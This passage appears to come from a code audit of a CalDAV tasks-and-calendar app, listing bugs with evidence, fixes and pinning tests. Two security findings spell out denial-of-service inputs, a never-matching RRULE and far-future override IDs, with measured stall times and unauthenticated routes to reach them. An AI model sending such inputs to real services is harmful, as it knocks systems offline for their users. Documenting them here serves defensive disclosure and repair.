refetch masks the discard) and only becomes load-bearing once the refetch is
removed, which is the whole reason it is here. The pin itself was also widened to
fire the drag on the real Sidebar rows rather than calling `setLists` from a
probe, and a second control asserts that adding or removing a list still
refetches, so "never re-run the effect" cannot satisfy it.

**Pinned by** `aug19 stage 4b — reordering the sidebar > does not refetch every task in the account when only the order changed` in `frontend/src/backlog.aug19.stage4b.test.tsx`.

### iCalendar edit path

#### [x] "This event" on the first slot of a RANGE=THISANDFUTURE override rewrites every later occurrence

`backend/tasksd/ical/edit.py:642` · **high** · bug · stage 3

`apply_occurrence_override` finds an existing override with `_find_override`, which matches purely on the RECURRENCE-ID *instant* and ignores the `RANGE` parameter. For an Apple/Thunderbird `RECURRENCE-ID;RANGE=THISANDFUTURE` component (RFC 5545 §3.2.13) that component carries the values for its own slot AND every later occurrence, so editing "this event" on the override's own slot mutates the shared component in place and silently rewrites all subsequent occurrences.

This is the exact invariant-#2 loss the audit already fixed twice for the sibling paths — `exclude_occurrence` (which now excludes `_is_thisandfuture` from its drop predicate, edit.py:667) and `split_series` (which now folds a governing TF override into the tail, edit.py:1109). `apply_occurrence_override` is the third path and was never given the guard: `_is_thisandfuture` exists in the file and is never consulted here.

The existing test looks like coverage but is vacuous for this case: `test_editing_a_thisandfuture_instance_edits_that_one` (test_recur.py:1108) deliberately edits `2026-01-20T09:00:00+00:00` — a slot the TF override *covers* but does not *anchor* — so `_find_override` misses and a fresh single-slot override is created, which is the correct branch. No test edits `2026-01-13T09:00:00+00:00`, the override's own anchor.

Fully reachable from the SPA: `recur._occurrence` gives the first covered instance the override's own RECURRENCE-ID (asserted at test_recur.py:1017), and CalendarView.tsx:839 sends `{recurrence_id: e.recurrence_id, scope: 'this'}` for that chip.

<details><summary>Evidence</summary>

```
edit.py:640-645:

    anchor = _anchor_from_iso(recurrence_id, master)
    override = _find_override(cal, anchor)          # matches by instant only
    if override is None:
        override = _new_override(master, anchor)
        cal.add_component(override)
    _apply_event_fields(override, replace(edit, rrule=UNSET), now)

`_find_override` (edit.py:600-606) never looks at `rid.params`, unlike `exclude_occurrence` at edit.py:667 which calls `_is_thisandfuture`.

Run against pinned icalendar 7.2.2 with the repo's own `_thisandfuture_series()` shape (weekly 09:00Z x4 + `RECURRENCE-ID;RANGE=THISANDFUTURE:20260113T090000Z / DTSTART:20260113T100000Z / SUMMARY:TF / LOCATION:Room B`):

  apply_occurrence_override(raw, '2026-01-13T09:00:00+00:00',
                            EventEdit(summary='just this one', location='Room C'))

Output resource still has exactly ONE override component, and it is the shared one:

  BEGIN:VEVENT
  SUMMARY:just this one
  DTSTART:20260113T100000Z
  RECURRENCE-ID;RANGE=THISANDFUTURE:20260113T090000Z
  LOCATION:Room C
  END:VEVENT

User-visible: the user clicks the Jan 13 chip, picks "This event", renames it — and Jan 20 and Jan 27 are renamed and re-located too. A drag of that chip (which sends DTSTART/DTEND with scope 'this') moves all three. The foreign client's authored values for the later occurrences are gone from the bytes PUT to Radicale, so the loss is permanent.
```

</details>

**Suggested fix.** Treat a THISANDFUTURE override as un-editable in place for a single-instance edit: in `apply_occurrence_override`, when the component `_find_override` returned carries `RANGE=THISANDFUTURE` and its RECURRENCE-ID equals the anchor, build a *new* single-slot override for the anchor instead (`_new_override` seeded from the TF override's values rather than the master's, so the instance keeps the values the user is looking at) and leave the TF component in place to keep governing the later slots. Add a test that edits the TF override's own slot and asserts the later occurrences keep the override's original summary/start.

**Pinned by** `test_editing_the_slot_a_this_and_future_override_anchors_leaves_later_ones_alone` in `backend/tests/test_backlog_aug19_stage3_ical.py`.

#### [x] Dragging a foreign MONTHLY/YEARLY series deletes the dragged occurrence and moves nothing else

`backend/tasksd/ical/edit.py:829` · **high** · bug · stage 3

`_shift_rrule` rotates only `BYDAY` on a `WEEKLY` rule. Its docstring dismisses the rest — "Other BY* parts (foreign clients only — our own rules never carry them) are left untouched" — but leaving them untouched is not a no-op: `shift_series` moves DTSTART by `delta` while `BYMONTHDAY` / ordinal `BYDAY` / `BYMONTH` keep naming the *old* day. The new DTSTART then no longer satisfies the rule, so it is not part of the recurrence set at all (dateutil and, through it, recurring_ical_events only emit DTSTART when it matches the BY* parts). The occurrence the user dragged disappears, every other occurrence stays exactly where it was, and a phantom extra occurrence appears at the far end because COUNT is now consumed from a later start.

`FREQ=MONTHLY;BYMONTHDAY=n` ("monthly on the 15th") and `FREQ=MONTHLY;BYDAY=1TU` ("first Tuesday") are what DAVx5/Tasks.org, jtx Board, Thunderbird and Apple all write for monthly repeats, so this is the ordinary shape of a foreign monthly series — not an exotic one. The write goes to Radicale, so the loss is permanent; the SPA shows the drag as successful until the next sync.

No test covers it: `test_shift_series_rotates_weekly_byday` is the only BY* shift test, and it exercises the one branch that is handled.

<details><summary>Evidence</summary>

```
edit.py:826-833:

    freq = [str(f).upper() for f in rule.get("FREQ", [])]
    if day_delta % 7 and "WEEKLY" in freq and "BYDAY" in rule:
        ...
    if changed:
        _set_rrule(master, rule)

Reproduced against pinned icalendar 7.2.2 / dateutil 2.9.0:

Input (a DAVx5-style "6th of every month"):
  DTSTART:20260106T090000Z / DTEND:20260106T093000Z
  RRULE:FREQ=MONTHLY;BYMONTHDAY=6;COUNT=4
  occurrences: 2026-01-06, 2026-02-06, 2026-03-06, 2026-04-06

User drags the Jan 6 chip to Jan 7 and picks "All events":
  shift_series(raw, '2026-01-06T09:00:00+00:00',
               EventEdit(dtstart=2026-01-07T09:00Z, dtend=2026-01-07T09:30Z))

Output:
  DTSTART:20260107T090000Z
  RRULE:FREQ=MONTHLY;COUNT=4;BYMONTHDAY=6      <- unchanged
  occurrences: 2026-02-06, 2026-03-06, 2026-04-06, 2026-05-06

The Jan occurrence the user dragged is GONE (there is no Jan 7 and no Jan 6 any more) and a May 6 the user never asked for has appeared. Nothing moved by a day.

Same with an ordinal BYDAY (`FREQ=MONTHLY;BYDAY=1TU;COUNT=4`):
  before: 2026-01-06, 2026-02-03, 2026-03-03, 2026-04-07
  after : 2026-02-03, 2026-03-03, 2026-04-07, 2026-05-05

Reachable in one gesture from the SPA: CalendarView.tsx:836 sends the changed times plus `recurrence_id` with scope 'all', and service.py:602-605 routes that to `shift_event` -> `shift_series`.
```

</details>

**Suggested fix.** Either (a) shift the day-selecting BY* parts alongside DTSTART — rotate `BYMONTHDAY` by `day_delta` and ordinal `BYDAY` codes by `day_delta % 7`, adjusting `BYMONTH` when the shift crosses a month/year boundary — or, far simpler and safe, (b) refuse the reschedule the way the dateness switch is already refused: when `day_delta % 7` (or any day change) would desynchronize a rule carrying `BYMONTHDAY`, `BYYEARDAY`, `BYWEEKNO`, `BYMONTH`, or an ordinal `BYDAY`, raise `ValueError("cannot reschedule a series with this repeat rule; edit occurrences instead")` so the route answers 422 instead of silently corrupting the schedule. Add tests for `FREQ=MONTHLY;BYMONTHDAY=6` and `FREQ=MONTHLY;BYDAY=1TU` asserting the occurrence count and the dragged day.

**Pinned by** `test_dragging_a_monthly_series_moves_it_instead_of_desynchronizing_the_rule` in `backend/tests/test_backlog_aug19_stage3_ical.py`.

#### [x] A far-future UNTIL (repeat-until 9999-12-31, or a foreign UNTIL=99991231T235959Z) raises OverflowError — an unmapped 500 that makes the series permanently uneditable

`backend/tasksd/ical/edit.py:813` · **medium** · bug · `minor` · stage 1

Two UNTIL writers add a timedelta or convert a zone without any range check, so a bound at (or near) the last representable date overflows `datetime`:

1. `_shift_until` does `(until.astimezone(zone) + delta).astimezone(timezone.utc)` (and `until + delta` on the floating path). Dragging a series whose rule carries `UNTIL=99991231T235959Z` forward by any amount overflows. `UNTIL=99991231T235959Z` is a real idiom for "forever" written by Exchange/EWS exports and several CalDAV clients, so it arrives from adversary (2) as ordinary content.

2. `_coerce_until` builds `datetime.combine(until, time(23,59,59), tzinfo=dtstart.tzinfo)` and then `_as_utc(...)`. For any series anchored in a negative-UTC-offset zone (`DTSTART;TZID=America/Chicago`, i.e. most US users), "Repeat until 2099…" is fine but "Repeat until 9999-12-31" converts to year 10000 and overflows. `app._parse_datelike` accepts any `date.fromisoformat`-parseable string, and the SPA's "Repeat until" is an `<input type="date">` that happily yields `9999-12-31`.

`patch_event` (app.py:1112) maps only `ValueError` to 422, and `OverflowError` is not a `ValueError`, so both escape as an unhandled 500 — and because the bad UNTIL is now stored, case 1 reproduces on every retry: that series can never be dragged again. The audit already fixed this exact class once (`smylte_find_free_time` OverflowError on the last representable day); these two sites were missed. No test in test_recur.py uses a boundary UNTIL.

<details><summary>Evidence</summary>

```
edit.py:808-813:

    dtstart = master.get("DTSTART")
    zone = getattr(getattr(dtstart, "dt", None), "tzinfo", None)
    if zone is None or not isinstance(until, datetime) or until.tzinfo is None:
        return until + delta
    return (until.astimezone(zone) + delta).astimezone(timezone.utc)

edit.py:295-300:

    if not isinstance(until, datetime):
        until = datetime.combine(until, time(23, 59, 59), tzinfo=dtstart.tzinfo)
    ...
    return _as_utc(until) if dtstart.tzinfo is not None else until.replace(tzinfo=None)

Both reproduced against pinned icalendar 7.2.2:

(1) DTSTART:20260106T090000Z / DTEND:20260106T093000Z / RRULE:FREQ=WEEKLY;UNTIL=99991231T235959Z
    shift_series(raw, '2026-01-06T09:00:00+00:00',
                 EventEdit(dtstart=2026-01-07T09:00Z, dtend=2026-01-07T09:30Z))
    -> OverflowError: date value out of range

(2) DTSTART;TZID=America/Chicago:20260106T090000 / RRULE:FREQ=WEEKLY;COUNT=6
    apply_event_changes(raw, EventEdit(rrule=rrule_from_spec('weekly', until=date(9999,12,31))))
    -> OverflowError: date value out of range

HTTP: PATCH /api/calendars/{c}/events/{uid} with {"repeat":"weekly","repeat_until":"9999-12-31"} (case 2) and a plain drag (case 1) both return 500 with no handler.

The mirror underflow exists too: a rule with `UNTIL=00010101T000000Z` dragged backwards hits `date value out of range` on the same lines.
```

</details>

**Suggested fix.** Clamp instead of overflowing. In `_shift_until` and `_coerce_until`, wrap the arithmetic/conversion and saturate at `datetime.max`/`datetime.min` (in UTC) on `OverflowError` — a bound at the end of representable time is "forever", which is what the caller meant. Alternatively validate `repeat_until` in `app._parse_datelike` and raise `ValueError` (422) for a date outside a sane range, and catch `OverflowError` alongside `ValueError` at app.py:1112 so a stored boundary UNTIL cannot 500. Add tests for `UNTIL=99991231T235959Z` + a forward drag and for `repeat_until=9999-12-31` on a `TZID=America/Chicago` series.

**Pinned by** `test_a_boundary_until_answers_the_client_instead_of_overflowing (parametrized: 'foreign UNTIL=9999 dragged', 'repeat_until=9999-12-31' — 2 XFAILs)` in `backend/tests/test_backlog_aug19_stage1.py`.

#### [x] _reconcile_overrides probes each override with an unbounded dateutil walk — one repeat change burns minutes of CPU under the global lock

`backend/tasksd/ical/edit.py:427` · **medium** · security · stage 2

`_reconcile_overrides` documents its own cost guard: it whitelists FREQ to the app's own vocabulary because "testing membership of a foreign rule means letting dateutil iterate from its DTSTART — the unbounded cost `recur._pathological_rule` refuses up front". That comment is the only thing making it look bounded, and it bounds the wrong half. The rule is ours, but the *probe target* — the override's RECURRENCE-ID — is attacker-controlled and unbounded: `rr.between(at, at, inc=True)` makes dateutil iterate the rule from DTSTART until it passes `at`, once per override component.

An override with a far-future RECURRENCE-ID on a DAILY rule is ~2.9M iterations. A foreign client sharing the collection can put an arbitrary number of override components in one resource (each is ~120 bytes), and the whole thing runs inside `service`'s global lock, so /healthz, /api/login and every other request block for the duration. The trigger is a single ordinary action by the owner or an MCP agent: change the event's repeat.

`recur._pathological_rule` exists precisely to refuse this class on the read path; the write path has no equivalent.

<details><summary>Evidence</summary>

```
edit.py:419-428:

    def _generated(anchor) -> bool:
        ...
        start, at = _comparable(dtstart.dt, anchor)
        rr = rrulestr(_rule_for_probe(rule, start, dtstart.dt), dtstart=start)
        return bool(rr.between(at, at, inc=True))

called once per override at edit.py:430-438.

Measured on this machine (icalendar 7.2.2, dateutil 2.9.0.post0), master `DTSTART:20260106T090000Z` + `RRULE:FREQ=WEEKLY;COUNT=4`, plus TWO override components with `RECURRENCE-ID:99991001T090000Z` and `99991002T090000Z`:

    apply_event_changes(raw, EventEdit(rrule=rrule_from_spec('daily')))
    -> 13.51 s wall clock

~6.75 s per override. 100 such override components (a ~15 KB resource) is ~11 minutes of blocked event loop; 1000 is ~2 hours. Nothing caps the override count, the RECURRENCE-ID year, or the total probe work.

App path: PATCH /api/calendars/{cal}/events/{uid} {"repeat":"daily"} (or `smylte_update_event(uid, repeat='daily')`) -> apply_event_changes -> _reconcile_overrides. Every retry re-runs it.
```

</details>

**Suggested fix.** Bound the probe instead of trusting the FREQ whitelist. Cheapest correct form: before calling `rr.between`, reject the override as "not generated" (or skip reconciliation for it, the safe direction the docstring already argues for) when the anchor is implausibly far from DTSTART — e.g. `abs(at - start) > timedelta(days=_MAX_TOTAL_INSTANCES)` — or use `rr.after(at - epsilon)` with dateutil's `cache` plus a hard iteration cap. Also cap the number of override components reconciled in one call. Add a test with a far-future RECURRENCE-ID asserting the call completes in well under a second.

**Pinned by** `test_changing_the_repeat_is_prompt_with_a_far_future_override` in `backend/tests/test_backlog_aug19_stage2.py`.

#### [x] split_series never checks that the anchor is an occurrence, so "this and following" duplicates a non-recurring event and silently no-ops its delete

`backend/tasksd/ical/edit.py:1084` · **medium** · bug · stage 3

`split_series` derives the head purely from `_rrule_dict(hmaster)`: if the master has no RRULE the head is returned completely unbounded, and a tail is minted anyway with a fresh UID at the anchor. Nothing anywhere on the path (mcp/api.py:435-441, app.py:1105-1106 `_check_scope`/`_check_recurrence_id`, service.py:600-601, engine.split_event) verifies that the resource actually recurs or that `recurrence_id` names a slot the rule generates.

Two concrete wrong outcomes:

1. Edit with `scope='thisandfuture'` on a non-recurring event and an anchor after DTSTART -> the original resource is PUT back untouched AND a second resource is created with a new UID at the anchor. The single event is now duplicated on the calendar, in two collections rows, with two UIDs — and because the tail carries the original's ATTENDEE/ORGANIZER, it is a second invitation.

2. Delete with `scope='thisandfuture'` on the same input -> `delete_tail=True`, head is not None, so `write_head` PUTs the unchanged resource and the API answers 204. Nothing was deleted, and the SPA optimistically removes the row (CalendarView.tsx:382).

On a genuinely recurring series the same missing check turns a stale anchor into schedule corruption: an anchor one day off (two tabs, or the 412 re-derive path in `engine.split_event` re-applying a stale `recurrence_id` against the fresh copy) bounds the head at that instant and restarts the tail's rule from a day that was never an occurrence, so every later occurrence moves. No test drives `split_series` with an anchor that is not an occurrence, or against a resource with no RRULE/RDATE.

<details><summary>Evidence</summary>

```
edit.py:1084-1090:

    rule = _rrule_dict(hmaster)
    if rule is not None:
        rule.pop("COUNT", None)
        rule["UNTIL"] = [_until_before(anchor)]
        _set_rrule(hmaster, rule)
    _drop_overrides(head, anchor, keep_before=True)

(no `else` branch, and no check that `anchor` is generated by `rule`)

Reproduced (icalendar 7.2.2):

  raw = single VEVENT UID:one@x DTSTART:20260106T090000Z DTEND:20260106T093000Z SUMMARY:Lunch
  head, tail = split_series(raw, '2026-05-01T10:00:00+00:00', EventEdit(summary='Lunch v2'))

  head is None -> False
  head: UID:one@x  DTSTART:20260106T090000Z  SUMMARY:Lunch      (unchanged but for SEQUENCE/DTSTAMP)
  tail: UID:d4324a32...@tasksd  DTSTART:20260501T100000Z  SUMMARY:Lunch v2

`engine.split_event` PUTs the tail to a fresh href and PUTs the head back, so the calendar ends up with both.

Reachable with no validation at all through MCP: `smylte_update_event(calendar_id, uid, summary='Lunch v2', scope='thisandfuture', recurrence_id='2026-05-01T10:00:00Z')`, and the delete variant `smylte_delete_event(calendar_id, uid, scope='thisandfuture', recurrence_id='2026-05-01T10:00:00Z')` returns success while leaving the event in place.
```

</details>

**Suggested fix.** Reject a split the resource cannot support. At the top of `split_series`, after `anchor = _anchor_from_iso(...)`: if the master carries neither RRULE nor RDATE, raise `ValueError("this event does not repeat; use scope='all'")`; and when a rule is present, verify the anchor is actually generated (the same `_generated` membership test `_reconcile_overrides` already implements, subject to the cost guard) and raise `ValueError("recurrence_id does not name an occurrence of this series")` otherwise. Both map to a clean 422. Add tests for the non-recurring edit, the non-recurring delete, and an off-by-a-day anchor on a weekly series.

**Pinned by** `test_this_and_following_on_a_non_repeating_event_does_not_duplicate_it` in `backend/tests/test_backlog_aug19_stage3_ical.py`.

### iCalendar read & recurrence

#### [x] A never-matching RRULE makes expansion iterate to year 9999 — both pathology guards score it "safe" because they measure yield, not iterations (unauthenticated DoS under the service lock)

`backend/tasksd/ical/recur.py:178` · **high** · security · stage 2

`_pathological_rule` has two bounds and both are functions of how many instances a rule *emits*: `_per_day` (density, limit 24) and `_instances_before` = per_day x days(DTSTART -> window_end) (limit 200 000). Neither bounds the work `recurring_ical_events`/`dateutil` does to *look* for instances. An RRULE whose BY* parts can never be satisfied emits nothing at all — per_day = 1, total ~200 — so it sails through both guards, and then `rrule.between()` steps the frequency forward one period at a time from DTSTART all the way to `datetime.MAXYEAR` (9999) before it gives up, because that is dateutil's only termination condition when nothing ever matches. The cost is independent of the requested window (a one-day booking query pays it in full), is charged per RRULE line and per VEVENT component with no aggregate cap, and `_link_busy` holds `self._lock` across `events_in_range` for every VEVENT collection, so the whole process stalls. Both public booking routes reach it: `GET /api/public/booking/{token}` -> `public_link_info` -> `_link_busy`, and the unauthenticated write `POST /api/public/booking/{token}/book` -> `book_slot` -> `_link_busy`. This is a third axis distinct from the two closed findings in docs/AUDIT.md (density, and the DTSTART->window skip): those were about rules that emit *too much*; this is a rule that emits *nothing*.

<details><summary>Evidence</summary>

```
recur.py:210-228 is the whole shape test — `per_day = _per_day(r)` / `if per_day > _MAX_PER_DAY` and `total = _instances_before(r, comp.get("DTSTART"), window_end)` / `if total > _MAX_TOTAL_INSTANCES`. For `RRULE:FREQ=DAILY;BYMONTH=2;BYMONTHDAY=30` (February never has a 30th) `_per_day` returns 1.0 (no BYHOUR/BYMINUTE/BYSECOND) and `_instances_before` returns ~212, so the guard returns None.

Measured against the pinned deps (icalendar 7.2.2 / recurring_ical_events 3.8.2, py3.11):

  raw = one VEVENT, DTSTART:20260101T090000Z, RRULE:FREQ=DAILY;BYMONTH=2;BYMONTHDAY=30   (215 bytes)
  recur.expand_occurrences(raw, date(2026,8,1), date(2026,8,2))  -> n=0, 4.93 s

Scales linearly, with no aggregate cap:
  1 distinct rule  in one VEVENT (211 B) ->  5.10 s
  4 distinct rules in one VEVENT (364 B) -> 20.04 s
  8 distinct rules in one VEVENT (568 B) -> 39.81 s
  20 VEVENT components   (3 052 B)       -> 100.55 s
(distinct rules = FREQ=DAILY;BYMONTH=2;BYMONTHDAY=30;BYHOUR=<0..7>)

Other never-matching shapes a foreign client can plausibly emit, same cost:
  FREQ=DAILY;BYSETPOS=5;BYDAY=MO      -> 6.71 s
  FREQ=DAILY;BYWEEKNO=54             -> 5.37 s
  FREQ=DAILY;BYMONTHDAY=-31;BYMONTH=2 -> 5.12 s
  FREQ=DAILY;BYYEARDAY=400           -> 5.28 s

End-to-end through the real service (in-memory DB, one collection, the 215-byte resource above seeded via store.upsert_item, then `svc._link_busy(TZ, Interval(day, day+1day))` — exactly what `public_link_info` and `book_slot` call):

  resource bytes: 215
  _link_busy over a ONE-DAY window: 4.92 s  busy=[]

Failure scenario: any client sharing the Radicale collection (DAVx5/Tasks.org/Thunderbird/jtx — adversary #2) PUTs a 3 KB .ics holding 20 VEVENTs with `RRULE:FREQ=DAILY;BYMONTH=2;BYMONTHDAY=30`. Every subsequent anonymous `GET /api/public/booking/<token>` and every `POST .../book` burns ~100 s of CPU inside `_link_busy` while holding `self._lock`, so /api/lists, /api/tasks, the calendar grid and /healthz all block behind it. The public POST limiter allows 15 requests/hour/client, i.e. ~25 minutes of wall-clock stall per client per hour. The owner's own calendar month fetch pays the same cost. Nothing in the suite covers a zero-yield rule: every guard test in tests/test_recur.py (test_subdaily_rule_is_refused_not_expanded, test_by_part_density_cannot_bypass_the_guard, test_dense_rule_with_ancient_dtstart_is_refused_promptly) uses a rule that emits a lot.
```

</details>

**Suggested fix.** Bound the search, not just the yield. Cheapest correct fix: before handing the calendar to `recurring_ical_events`, clamp each rule's search horizon to the query window — expansion outside `[window_start, window_end)` is discarded anyway, so re-emitting each RRULE with `UNTIL = window_end` (dropping it when the rule already carries an earlier UNTIL, and keeping COUNT semantics by expanding through dateutil directly) makes dateutil stop at the window instead of at MAXYEAR. Failing that, add an explicit iteration/time budget around `query.between` (run it against a bounded `rrule` and abort past N steps), and make `_MAX_TOTAL_INSTANCES` an aggregate over every RRULE of every VEVENT in the resource rather than a per-rule check. Add a test asserting `FREQ=DAILY;BYMONTH=2;BYMONTHDAY=30` either raises promptly or completes in well under a second.

**Pinned by** `test_a_rule_that_can_never_match_is_expanded_promptly` in `backend/tests/test_backlog_aug19_stage2.py`.

#### [x] Recurrence expansion emits occurrences whose end precedes their start on the DST spring-forward (and 3x-long ones on the fall-back), so the instance blocks nothing in the busy set

`backend/tasksd/ical/recur.py:234` · **medium** · bug · stage 3

`recurring_ical_events` derives each instance's end by wall-clock arithmetic on the instance's DTSTART (and `_end_fields` does the same for the DURATION path: `_iso(dtstart.dt + dur.dt)` — `aware + timedelta` operates on naive fields and re-derives the offset). `expand_occurrences` accepts whatever comes back without checking that `end >= start`. When a recurring event's local start falls inside the hour the clock skips, PEP-495 resolves the start with the pre-transition offset and the end with the post-transition offset, so the emitted occurrence runs backwards; on the fall-back day the same arithmetic stretches the instance by an extra hour. RFC 5545 §3.8.5.3 says every instance carries the duration of the first instance, so both are wrong, and the backwards one is wrong under any reading. The consequence is not cosmetic: `scheduling.busy_intervals` discards any interval that is not strictly positive, so on that one day the owner's recurring meeting stops blocking bookings entirely, and the public page offers the time as free. Nothing in tests/test_recur.py asserts an occurrence *end* across a transition — `test_dst_transition_keeps_local_wall_time` and `test_shift_series_dst_wall_clock_preserved` only assert `.start`.

<details><summary>Evidence</summary>

```
recur.py:66-74 (`_end_fields`) and recur.py:232-236 (`_occurrence`, which stores `end` unexamined).

A weekly/daily 02:30 America/Chicago series with `DURATION:PT30M` (VTIMEZONE for America/Chicago embedded), expanded over 2026-03-01..2026-03-20 — 2026-03-08 02:00 CST jumps to 03:00 CDT:

  2026-03-06T02:30:00-06:00 -> 2026-03-06T03:00:00-06:00     # 30 min, fine
  2026-03-07T02:30:00-06:00 -> 2026-03-07T03:00:00-06:00
  2026-03-08T02:30:00-06:00 -> 2026-03-08T03:00:00-05:00     # start 08:30Z, END 08:00Z  <-- backwards
  2026-03-09T02:30:00-05:00 -> 2026-03-09T03:00:00-05:00

The DTEND-authored variant (DTSTART;TZID=America/Chicago:...T023000 / DTEND;TZID=America/Chicago:...T030000) produces exactly the same 2026-03-08 row, so this is not specific to DURATION.

The fall-back direction, a 01:30 + PT30M series over 2026-10-25..2026-11-10:

  2026-11-01T01:30:00-05:00 -> 2026-11-01T02:00:00-06:00     # 06:30Z -> 08:00Z = 90 minutes, not 30

What it costs downstream:

  ev = {"start": "2026-03-08T02:30:00-06:00", "end": "2026-03-08T03:00:00-05:00"}
  scheduling.busy_intervals([ev], ZoneInfo("America/Chicago"))  -> []

Failure scenario: the owner (or any foreign client) has a recurring 02:30-03:00 local entry — a nightly/weekly maintenance or overseas call. On 2026-03-08 the expander hands `events_in_range` an occurrence running 08:30Z -> 08:00Z; `_link_busy` -> `busy_intervals` drops it, so the public booking page advertises that half hour as free and an anonymous visitor can take it. In the SPA the same row renders as "3:30 AM - 3:00 AM". On 2026-11-01 the mirror case blocks 90 minutes of availability instead of 30.
```

</details>

**Suggested fix.** Validate/repair the instance span in `_occurrence`: compute the master's exact duration once (first instance's DTEND-DTSTART, or its DURATION) and, when the library's end is not strictly after the start, derive `end = _u(start) + duration` and convert back — or at minimum clamp a backwards end to the start so it can never be silently discarded downstream. Add tests asserting `end > start` for every occurrence of a 02:30 series across 2026-03-08 and a 30-minute span across 2026-11-01.

**Pinned by** `test_every_expanded_occurrence_across_spring_forward_blocks_real_time` in `backend/tests/test_backlog_aug19_stage3_ical.py`.

### MCP tools

#### [x] smylte_list_tasks implements the comparator order.ts documents as wrong, so after one drag every newly-created task sinks below the whole account and falls off the first page

`backend/tasksd/mcp/api.py:133` · **high** · bug · stage 3

`_display_order` sorts `(order is None, order or 0)` first — a null `sort_order` sorts LAST. Its docstring claims it "Mirrors `frontend/src/order.ts` — manual position, due date, priority, title, then uid — key for key, including nulls-last on every one" and that "a model paging with `limit` is entitled to that being true". But order.ts exports TWO functions and the app calls the other one. `compareTasks` is the nulls-last comparator `_display_order` copies, and its own docstring says: "This comparator ... is NOT how a list is ordered — see `sortTasks`, which is what every view calls. The difference matters because a drag renumbers the whole account (the server's ReorderTasks model says so explicitly: 'nothing left null once a drag lands'), so after the first drag a null position stops meaning 'ordinary, unplaced' and starts meaning 'created since the last drag' — and sinking those to the bottom of every view is not what anyone wants." `sortTasks` therefore interleaves unplaced tasks among the placed ones by their intrinsic keys. `_display_order` reproduces the rejected comparator, and it is the ONE thing that decides which rows `page()` slices into the model's first (usually only) page. This is the same defect docs/AUDIT.md already closed once on the frontend ("One drag assigns a manual position to every task on the account, so every task created afterwards sorts to the very bottom of every view"), reintroduced on the MCP surface. A secondary divergence in the same function: `due_key` is compared as a raw string, while order.ts's `dueAt` deliberately parses instead, commenting "a due may be a bare date, a floating local datetime this app wrote, or a zone-anchored one another CalDAV client wrote — and those three do not sort lexically in the order they actually fall in."

<details><summary>Evidence</summary>

```
backend/tasksd/mcp/api.py:132-138
    return (
        (order is None, order or 0),      # nulls LAST  <- compareTasks, not sortTasks
        (due_key is None, due_key or ""),
        ...

frontend/src/order.ts:96-98 (compareTasks, the one copied)
    const manual = nullsLast(a.sort_order ?? null, b.sort_order ?? null, (x, y) => x - y)

frontend/src/order.ts:119-140 (sortTasks, the one every view calls)
    // an unplaced task takes a spot just before the first placed task that ought to come after it
    at.set(t.uid, next < 0 ? placed.length : next - 0.5)

backend/tasksd/app.py:119-131 (ReorderTasks)
    "...positions plain 1..N integers: ... and nothing left null once a drag lands."

Failure scenario: the owner has 200 tasks and has dragged a row once, so all 200 carry
sort_order 1..200. Tomorrow they add "Pay tax bill, due tomorrow" — via smylte_create_task
itself, or via DAVx5/Tasks.org (whose tasks can never have a sort_order at all, since the
sidecar "is app-only and never goes on the wire"). That task has sort_order = null.
  tools/call smylte_list_tasks {}          # no list_id, default limit 50
  -> _display_order puts every one of the 200 placed tasks ahead of it
  -> page() returns rows[0:50] = 50 manually-placed tasks, has_more=true
The model answering "what's due next?" never sees tomorrow's deadline; the app's own Tasks
pane shows it interleaved near the top. Adding due_before does not help either — the same
comparator runs after the filter, so the placed tasks still lead.
```

</details>

**Suggested fix.** Port `sortTasks`, not `compareTasks`: normalise placed tasks to their index, give each unplaced task the position of the first placed task it intrinsically precedes (minus 0.5), then sort by that single number with the intrinsic keys as tie-break — exactly as order.ts:119-140 does. Parse `due` to a comparable instant instead of lexically comparing the string, mirroring `dueAt`. Add a test with one placed task due next year and one unplaced task due tomorrow asserting the unplaced one comes first.

**Pinned by** `test_a_task_created_after_a_drag_is_not_sunk_below_the_whole_account` in `backend/tests/test_backlog_aug19_stage3_core.py`.

#### [x] smylte_delete_event skips the recurrence_id ISO check the HTTP DELETE route performs, so a space instead of a T is reported as "the calendar server may be unreachable"

`backend/tasksd/mcp/api.py:492` · **medium** · bug · `minor` · stage 1

`McpApi.delete_event` checks only that `recurrence_id` is non-empty. The HTTP route for the identical operation calls `_check_recurrence_id` (app.py:490-513), whose docstring states the missing half explicitly: "A non-ISO anchor is the other half: it reaches `date.fromisoformat` deep in the edit path, where the ValueError has no handler and escapes as a 500. Reject both here, where the client still gets a usable error." On the MCP path there is no ISO check and — unlike `update_event`, which wraps its service call in `except ValueError` (api.py:472-473) — `delete_event` has no ValueError arm at all. `ical.edit._anchor_from_iso` (edit.py:529-530) does `datetime.fromisoformat(s) if "T" in s else date.fromisoformat(s)`, so the ValueError escapes to `McpServer._call`'s blanket handler and is reported as a backend outage. The mistake is not exotic: `_parse_dt`, the MCP API's own date parser used for every other date argument in the same file, deliberately accepts a space separator (`if "T" in s or " " in s`), so a model that writes `"2026-09-08 09:00"` for `recurrence_id` is following the convention the rest of the tool surface taught it. The advice it gets back tells it to retry forever. `recurrence_id="   "` also slips past `not recurrence_id` (HTTP uses `(recurrence_id or "").strip()`) and lands in the same place.

<details><summary>Evidence</summary>

```
backend/tasksd/mcp/api.py:489-500
    def delete_event(self, calendar_id, uid, *, recurrence_id=None, scope="all"):
        if scope not in ("all", "this", "thisandfuture"): raise ToolError(...)
        if scope in ("this", "thisandfuture") and not recurrence_id: raise ToolError(...)
        ...
        with _not_found(...):                       # KeyError only
            self._svc.delete_event(href, uid, recurrence_id=recurrence_id, scope=scope)
    # no ISO validation, no `except ValueError`

backend/tasksd/app.py:505-513 (the same operation over HTTP)
    try:
        datetime.fromisoformat(s) if "T" in s else date.fromisoformat(s)
    except ValueError:
        raise HTTPException(422, f"invalid recurrence_id: {s!r}")

backend/tasksd/ical/edit.py:529-530
    s = recurrence_id.strip()
    anchor = datetime.fromisoformat(s) if "T" in s else date.fromisoformat(s)   # ValueError

backend/tasksd/mcp/api.py:44-46 (what taught the model the space form)
    if "T" in s or " " in s:
        return datetime.fromisoformat(s.replace(" ", "T"))

Failure scenario: a daily stand-up series on calendar `work`.
  tools/call smylte_delete_event {"calendar_id":"work","uid":"a1@tasksd",
                                  "scope":"this","recurrence_id":"2026-09-08 09:00"}
  -> guard passes (non-empty), service dispatches exclude_event_occurrence
  -> _anchor_from_iso: "T" not in s -> date.fromisoformat('2026-09-08 09:00') -> ValueError
  -> server.py:187 blanket handler
  -> {"isError": true, "text": "smylte_delete_event could not be completed (ValueError).
      The calendar server may be unreachable; try again shortly."}
Over HTTP the identical anchor is a 422 saying `invalid recurrence_id`. Same for
